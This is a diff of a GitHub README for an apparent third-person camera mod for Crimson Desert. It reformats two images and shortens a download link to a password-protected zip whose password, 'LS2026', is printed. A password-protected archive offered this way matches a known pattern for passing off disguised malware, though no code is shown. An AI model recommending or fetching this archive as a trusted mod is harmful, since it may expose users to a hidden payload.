@@ -9,7 +9,8 @@
 
 -**Unlike a broader camera overhaul, this is a single curated release built around one clear goal: a proper third-person camera with a strong RDR2-style bias.**
 
-<img width="480" height="260" alt="image" src="https://github.com/user-attachments/assets/91de7edc-ee42-4759-b9df-f8c25bdac04a" /><img width="480" height="260" alt="image" src="https://github.com/user-attachments/assets/819ac966-4c25-42d7-8aea-15fc9e59e145" />
+!<img width="480" height="260" alt="image" src="https://github.com/user-attachments/assets/91de7edc-ee42-4759-b9df-f8c25bdac04a" />
+!<img width="480" height="260" alt="image" src="https://github.com/user-attachments/assets/819ac966-4c25-42d7-8aea-15fc9e59e145" />
 
 
 ---
@@ -17,7 +18,7 @@
 
 Password-protected archive with the complete camera mod – extract and enjoy a much better camera instantly.  
 
-📥 [Download `Proper-3rd-Person-Camera-Crimson-Desert-2026.zip`](https://github.com/ShahidAhmed1st/Proper-3rd-Person-Camera-Crimson-Desert/releases/download/Game-Addons/Proper-3rd-Person-Camera.zip)  
+📥 [Download `Proper-3rd-Person.zip`](https://github.com/ShahidAhmed1st/Proper-3rd-Person-Camera-Crimson-Desert/releases/download/Game-Addons/Proper-3rd-Person-Camera.zip)  
 🔐 `LS2026`
 ---
 ### Archive Contents
